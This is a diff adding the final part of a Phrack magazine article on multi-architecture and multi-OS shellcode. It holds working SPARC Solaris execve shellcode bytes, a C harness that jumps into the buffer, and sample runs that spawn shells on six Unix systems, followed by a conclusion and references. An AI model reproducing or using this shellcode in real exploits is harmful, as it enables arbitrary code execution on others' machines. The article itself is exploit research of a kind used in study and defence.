+        &quot;\x2f\x73\x68\x42&quot;      /* .ascii       &quot;/sh&quot;, .byte 0xdummy    */
+
+
+        /* Sparc Solaris execve() by an unknown author */
+        &quot;\x2d\x0b\xd8\x9a&quot;	/* sethi	$0xbd89a, %l6           */
+        &quot;\xac\x15\xa1\x6e&quot;	/* or		%l6, 0x16e, %l6         */
+        &quot;\x2f\x0b\xdc\xda&quot;	/* sethi	$0xbdcda, %l7           */
+        &quot;\x90\x0b\x80\x0e&quot;	/* and		%sp, %sp, %o0           */
+        &quot;\x92\x03\xa0\x08&quot;	/* add		%sp, 8, %o1             */
+        &quot;\x94\x1a\x80\x0a&quot;	/* xor		%o2, %o2, %o2           */
+        &quot;\x9c\x03\xa0\x10&quot;	/* add		%sp, 0x10, %sp          */
+        &quot;\xec\x3b\xbf\xf0&quot;	/* std		%l6, [%sp - 0x10]       */
+        &quot;\xdc\x23\xbf\xf8&quot;	/* st		%sp, [%sp - 0x08]       */
+        &quot;\xc0\x23\xbf\xfc&quot;	/* st		%g0, [%sp - 0x04]       */
+        &quot;\x82\x10\x20\x3b&quot;	/* mov		$0x3b, %g1              */
+        &quot;\x91\xd0\x20\x08&quot;	/* ta		8                       */
+;
+
+
+int main(void)
+{
+#if defined(AIX)
+	/* copyright LAST STAGE OF DELIRIUM feb 2001 poland */
+        int jump[2]={(int)sc,*((int*)&amp;main+1)};
+
+        ((*(void (*)())jump)());
+#else
+        void (*f)(void) = (void (*)(void)) sc;
+
+        f();
+#endif
+
+        return 0;
+}
+
+
+[openbsd]$ gcc ass.c
+[openbsd]$ ./a.out
+$ uname -ms
+OpenBSD i386
+
+[freebsd]$ gcc ass.c
+[freebsd]$ ./a.out
+$ uname -ms
+FreeBSD i386
+
+[linux]$ gcc ass.c
+[linux]$ ./a.out
+$ uname -ms
+Linux i686
+
+[solaris]$ gcc ass.c
+[solaris]$ ./a.out
+$ uname -ms
+SunOS sun4u
+
+[irix]$ gcc ass.c
+[irix]$ ./a.out
+$ uname -ms
+IRIX IP22
+
+[aix]$ gcc ass.c
+[aix]$ ./a.out
+$ uname -ms
+AIX 000089101000
+
+
+
+Conclusion
+-----------
+
+  Architecture spanning shellcode is a specially crafted code that executes
+differently depending on the architecture it is being run on. The code
+achieves that by using a series of bytes which execute differently on
+different architectures.
+
+  OS spanning shellcode is specially crafted code that executes on
+multiple operating systems all running on the same platform. The code
+achieves that by setting up the registers and the stack in a way that
+satisfies the operating systems that the code is being run on.
+
+
+
+Credits / Thanks
+----------------
+
+Greg Hoglund	working with me on this idea at the challenge party
+
+prole and harm	for coming with an idea way before the challenge
+		http://www.redgeek.net/~prole/ASSC.txt
+
+gravitino.net, GHI, skyper, spoonm
+
+
+
+References
+----------
+
+[1] Caezar's challenge
+    http://www.caezarschallenge.org
+
+[2] Writing MIPS/IRIX shellcode
+    scut (phrack 56)
+
+[3] Smashing The Stack For Fun And Profit
+    Aleph One (phrack 49)
+
+[4] SPARC Architecture, Assembly Language Programming, and C. 2nd ed.
+    Richard P. Paul
+
+[5] IA-32 Intel Architecture, Software Developer's Manual
+    Intel, Corp
+    http://developer.intel.com
+
+[6] Computer Organization and Design
+    David A. Patterson and John L. Hennessy
+
+[7] MIPS RISC Architecture
+    Gerry Kane and Joe Heinrich
+
+[8] UNIX Assembly Codes Development for Vulnerabilities Illustration
+    Purposes
+    The Last Stage of Delirium Research Group http://lsd-pl.net
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
